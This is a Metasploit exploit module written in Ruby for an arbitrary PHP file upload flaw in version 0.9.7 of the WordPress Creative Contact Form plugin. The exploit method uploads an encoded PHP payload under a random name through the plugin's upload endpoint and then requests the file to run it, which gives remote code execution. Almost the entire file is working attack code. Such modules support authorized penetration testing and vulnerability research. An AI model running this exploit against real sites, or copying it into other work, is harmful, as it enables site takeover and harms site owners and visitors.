##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::HTTP::Wordpress
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wordpress Creative Contact Form Upload Vulnerability',
      'Description'    => %q{
        This module exploits an arbitrary PHP code upload in the WordPress Creative Contact
        Form version 0.9.7. The vulnerability allows for arbitrary file upload and remote code execution.
      },
      'Author'         =>
        [
          'Gianni Angelozzi', # Vulnerability discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>'  # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['EDB', '35057'],
          ['OSVDB', '113669'],
          ['WPVDB', '7652']
        ],
      'Privileged'     => false,
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        => [['Creative Contact Form 0.9.7', {}]],
      'DisclosureDate' => 'Oct 22 2014',
      'DefaultTarget'  => 0)
    )
  end

  def check
    check_plugin_version_from_readme('sexy-contact-form', '1.0.0')
  end

  def exploit
    php_pagename = rand_text_alpha(8 + rand(8)) + '.php'

    data = Rex::MIME::Message.new
    data.add_part(payload.encoded, 'application/octet-stream', nil, "form-data; name=\"files[]\"; filename=\"#{php_pagename}\"")
    post_data = data.to_s

    res = send_request_cgi({
      'uri'       => normalize_uri(wordpress_url_plugins, 'sexy-contact-form', 'includes', 'fileupload', 'index.php'),
      'method'    => 'POST',
      'ctype'     => "multipart/form-data; boundary=#{data.bound}",
      'data'      => post_data
    })

    if res
      if res.code == 200 && res.body =~ /files|#{php_pagename}/
        print_good("#{peer} - Our payload is at: #{php_pagename}. Calling payload...")
        register_files_for_cleanup(php_pagename)
      else
        fail_with(Failure::UnexpectedReply, "#{peer} - Unable to deploy payload, server returned #{res.code}")
      end
    else
      fail_with(Failure::Unknown, 'ERROR')
    end

    print_status("#{peer} - Calling payload...")
    send_request_cgi(
      'uri'       => normalize_uri(wordpress_url_plugins, 'sexy-contact-form', 'includes', 'fileupload', 'files', php_pagename)
    )
  end
end